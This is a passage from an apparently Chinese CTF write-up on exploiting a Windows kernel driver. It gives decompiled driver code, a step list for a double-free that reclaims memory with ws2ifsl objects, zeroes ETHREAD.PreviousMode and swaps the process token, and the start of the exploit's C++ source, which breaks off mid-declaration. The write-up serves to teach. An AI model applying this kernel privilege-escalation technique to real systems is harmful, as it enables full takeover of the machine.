Blink);</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(__Mode) = Mode;</span><br><span class="line">          v12 = <span class="built_in">InitializeCancelQueue</span>(_Pool2, (<span class="type">int</span>)_object, __Mode, (<span class="type">int</span>)Flink, Blink);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          pFileObj-&gt;FsContext = (PVOID)_Pool2;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>InitializeRequestQueue &amp;&amp; InitializeCancelQueue: 初始化Apc请求&#x2F;取消队列</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeRequestQueue</span><span class="params">(PVOID Pool, PVOID a2, <span class="type">char</span> Mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)Pool + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">3</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  *((_QWORD *)Pool + <span class="number">2</span>) = (<span class="type">char</span> *)Pool + <span class="number">16</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)Pool + <span class="number">5</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = Mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)Pool + <span class="number">48</span>,</span><br><span class="line">      a2,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      RequestRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">InitializeCancelQueue</span><span class="params">(PVOID pool, PVOID obj, <span class="type">char</span> mode, <span class="keyword">struct</span> _IRP *a4, PVOID ApcContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line">  PVOID ApcRoutine; <span class="comment">// [rsp+68h] [rbp+20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ApcRoutine = a4;</span><br><span class="line">  *((_BYTE *)pool + <span class="number">152</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">18</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  *((_QWORD *)pool + <span class="number">17</span>) = (<span class="type">char</span> *)pool + <span class="number">136</span>;</span><br><span class="line">  <span class="built_in">KeInitializeSpinLock</span>((PKSPIN_LOCK)pool + <span class="number">20</span>);</span><br><span class="line">  v8 = <span class="built_in">PsWrapApcWow64Thread</span>(&amp;ApcContext, &amp;ApcRoutine);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = mode;</span><br><span class="line">    <span class="built_in">KeInitializeApc</span>(</span><br><span class="line">      (<span class="type">char</span> *)pool + <span class="number">168</span>,</span><br><span class="line">      obj,</span><br><span class="line">      <span class="number">0</span>i64,</span><br><span class="line">      guard_check_icall_nop,</span><br><span class="line">      CancelRundownRoutine,</span><br><span class="line">      ApcRoutine,</span><br><span class="line">      v10,</span><br><span class="line">      ApcContext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>释放的位置在DispatchClose函数中 <code>ExFreePoolWithTag</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  FsContext = (PVOID *)a2-&gt;Tail.Overlay.CurrentStackLocation-&gt;FileObject-&gt;FsContext;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)FsContext == <span class="string">&#x27;corP&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">ObfDereferenceObject</span>(FsContext[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">DereferenceProcessContext</span>(FsContext);</span><br><span class="line">LABEL_8:</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是这个池大小 0x110，加上PoolHeader就是0x120</p>
<p><strong>在CloseHandle时，调用<code>ObfDereferenceObject</code>函数，也就是将这个位置上的值<code>-1</code>。因此我们可以将<code>ETHREAD.PreviousMode</code> 从 1减为0。</strong></p>
<p>因此大致流程</p>
<ul>
<li>heap spray 减少碎片</li>
<li>allocate ContiguousMemory &amp;&amp; MDL</li>
<li>free ContiguousMemory &amp;&amp; MDL</li>
<li>使用 ws2ifsl 占位MDL (Ws2P ProcData)</li>
<li>double free ContiguousMemory &amp;&amp; MDL</li>
<li>使用Io占位MDL，修改Ws2P偏移为28的值为<code>ETHREAD.PreviousMode</code></li>
<li>CloseHandler 导致<code>ETHREAD.PreviousMode</code>为0</li>
<li>NtWriteVirtualMemory 任意地址写，替换token</li>
</ul>
<p>但是改成x86的程序后，导致泄露的EPROCESS地址被截断。</p>
<p>因此官方给出三个文件</p>
<ul>
<li>helper.exe 64位，使用NtQuerySystemInfomation获取信息</li>
<li>poc.exe: 32位，</li>
<li>exp.exe：调用两个文件</li>
<li>使用了命名管道进行通信同步</li>
</ul>
<p>必须等待回收资源才能减去1</p>
<p>Nu1L 提了一个关闭 dynbase，通过这个也可以修改</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-170">&#x2F;DYNAMICBASE（使用地址空间布局随机化功能） | Microsoft Learn</a></li>
</ul>
<p>exp</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Device </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE            <span class="string">L&quot;\\\\.\\IoctlTest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE32  0x9C402400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE32   0x9C402408</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE64  0x9C402404</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE64   0x9C40240C</span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate64</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Allocate64\r\n&quot;);</span></span><br><span class="line">	BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BYTE szOutBuffer[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PULONG)szInbuffer = uSize;</span><br><span class="line">	DWORD dwBytesReturned;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice, </span><br><span class="line">		IOCTL_ALLOCATE64, </span><br><span class="line">		szInbuffer, <span class="built_in">sizeof</span>(szInbuffer), </span><br><span class="line">		szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer), </span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE64\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate32</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Allocate32\r\n&quot;);</span></span><br><span class="line">	BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BYTE szOutBuffer[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	*(PULONG)szInbuffer = uSize;</span><br><span class="line">	DWORD dwBytesReturned;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice,</span><br><span class="line">		IOCTL_ALLOCATE32,</span><br><span class="line">		szInbuffer, <span class="built_in">sizeof</span>(szInbuffer),</span><br><span class="line">		szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer),</span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE32\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (!ulInputBufferLength || !ulOutputBufferLength)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	v3 = 0xC000000D;</span></span><br><span class="line"><span class="comment">//	goto LABEL_34;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function">VOID <span class="title">Free64</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Free64\r\n&quot;);</span></span><br><span class="line">	BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		 g_hDevice, </span><br><span class="line">		IOCTL_RELEASE64, </span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE64\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// wprintf(L&quot;first free succeeded, dwOutput = %d\n&quot;, dwOutput);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Free32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//wprintf(L&quot;[+] Free32\r\n&quot;);</span></span><br><span class="line">	BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">	BOOL ret = FALSE;</span><br><span class="line">	DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">	ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		g_hDevice,</span><br><span class="line">		IOCTL_RELEASE32,</span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">		buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">		&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE32\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get Kernel Infomation</span></span><br><span class="line">ULONG64   g_SystemEprocess;</span><br><span class="line">ULONG64   